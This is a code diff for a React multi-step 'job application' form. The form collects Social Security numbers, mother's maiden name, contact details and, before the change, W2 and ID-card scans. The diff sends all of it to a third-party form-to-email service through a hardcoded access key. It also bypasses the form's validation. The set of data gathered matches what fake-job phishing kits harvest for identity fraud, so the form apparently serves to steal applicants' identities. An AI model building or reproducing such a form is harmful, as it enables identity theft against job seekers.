@@ -4,7 +4,6 @@ import { useNavigate } from 'react-router-dom';
 import Step1 from '../components/FormInput/Step1';
 import Step2 from '../components/FormInput/Step2';
 import Step3 from '../components/FormInput/Step3';
-import Step4 from '../components/FormInput/Step4';
 
 const Form = () => {
   const navigate = useNavigate();
@@ -19,13 +18,14 @@ const Form = () => {
     ssn: '',
     startDate: '',
     telephone: '',
-    w2Form: null,
+   /*  w2Form: null,
     idCardFront: null,
     idCardBack: null,
-    utilityBill: null,
+    utilityBill: null, */
   });
 
   const [errors, setErrors] = useState({});
+  const [result, setResult] = useState(''); // Add this to hold submission result
 
   const validateStep = () => {
     const newErrors = {};
@@ -45,15 +45,15 @@ const Form = () => {
       case 3:
         if (!formData.startDate) newErrors.startDate = 'Start Date is required';
         if (!formData.telephone) newErrors.telephone = 'Telephone is required';
-        if (!formData.w2Form) newErrors.w2Form = 'W2 Form is required';
-        if (!formData.idCardFront) newErrors.idCardFront = 'ID Card Front is required';
+        /* if (!formData.w2Form) newErrors.w2Form = 'W2 Form is required';
+        if (!formData.idCardFront) newErrors.idCardFront = 'ID Card Front is required'; */
         break;
-      case 4:
+     /*  case 4:
         if (!formData.idCardBack) newErrors.idCardBack = 'ID Card Back is required';
         if (!formData.utilityBill) newErrors.utilityBill = 'Utility Bill is required';
         break;
       default:
-        break;
+        break; */
     }
     setErrors(newErrors);
     return Object.keys(newErrors).length === 0;
@@ -84,59 +84,55 @@ const Form = () => {
     }
   };
 
-  const handleSubmit = async (e) => {
-    e.preventDefault();
-    if (validateStep()) {
-      const data = new FormData(e.target);
-      for (const key in formData) {
-        if (formData[key] !== null) {
-          data.append(key, formData[key]);
-        }
-      }
+  const onSubmit = async (event) => {
+    event.preventDefault();
 
-      try {
-        const response = await fetch('/api/submit-form', {
-          method: 'POST',
-          body: data,
+    setResult("Sending...");
+
+    // Create a new FormData object
+    const formDataObj = new FormData();
+
+    // Append form data from state to FormData object
+    for (const key in formData) {
+      if (formData[key] !== null) {
+        formDataObj.append(key, formData[key]);
+      }
+    }
+
+    // Append the Web3Forms access key
+    formDataObj.append("access_key", "2ca25c93-6975-46f5-a54d-9f43358d6f3f");
+
+    try {
+      // Submit the form data to Web3Forms
+      const response = await fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        body: formDataObj,
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        setResult("Form Submitted Successfully");
+        setFormData({
+          lastName: '',
+          firstName: '',
+          mothersMaidenName: '',
+          address1: '',
+          email: '',
+          positionApplied: '',
+          ssn: '',
+          startDate: '',
+          telephone: '',
         });
-
-        const contentType = response.headers.get('content-type');
-        let result;
-
-        if (contentType && contentType.includes('application/json')) {
-          result = await response.json();
-        } else {
-          result = await response.text();
-        }
-
-        if (response.ok) {
-          alert(result.message || 'Form submitted successfully');
-          setFormData({
-            lastName: '',
-            firstName: '',
-            mothersMaidenName: '',
-            address1: '',
-            email: '',
-            positionApplied: '',
-            ssn: '',
-            startDate: '',
-            telephone: '',
-            w2Form: null,
-            idCardFront: null,
-            idCardBack: null,
-            utilityBill: null,
-          });
-          setErrors({});
-          setCurrentStep(1);
-          navigate('/');
-        } else {
-          console.error('Submission error:', result);
-          alert(result.error || 'Form submission failed');
-        }
-      } catch (error) {
-        console.error('Error during form submission:', error);
-        alert('An unexpected error occurred. Please try again.');
+        setCurrentStep(1);
+        navigate('/');
+      } else {
+        console.error("Error:", data);
+        setResult(data.message || "Form submission failed");
       }
+    } catch (error) {
+      console.error("Error during form submission:", error);
+      setResult("An unexpected error occurred. Please try again.");
     }
   };
 
@@ -151,7 +147,7 @@ const Form = () => {
         />
       </div>
 
-      <form onSubmit={handleSubmit}>
+      <form onSubmit={onSubmit}>
         {currentStep === 1 && (
           <Step1 formData={formData} errors={errors} handleChange={handleChange} />
         )}
@@ -164,9 +160,9 @@ const Form = () => {
           <Step3 formData={formData} errors={errors} handleChange={handleChange} />
         )}
 
-        {currentStep === 4 && (
+     {/*    {currentStep === 4 && (
           <Step4 formData={formData} errors={errors} handleChange={handleChange} />
-        )}
+        )} */}
 
         <div className='flex justify-between mt-10'>
           {currentStep > 1 && (
@@ -178,7 +174,7 @@ const Form = () => {
               Previous
             </button>
           )}
-          {currentStep < 4 && (
+          {currentStep < 3 && (
             <button
               type='button'
               onClick={handleNext}
@@ -187,7 +183,7 @@ const Form = () => {
               Next
             </button>
           )}
-          {currentStep === 4 && (
+          {currentStep === 3 && (
             <button
               type='submit'
               className='bg-green-500 text-white px-4 py-2 rounded-lg'
@@ -197,6 +193,8 @@ const Form = () => {
           )}
         </div>
       </form>
+
+      {result && <p className='mt-4 text-white'>{result}</p>} {/* Display result */}
     </div>
   );
 };
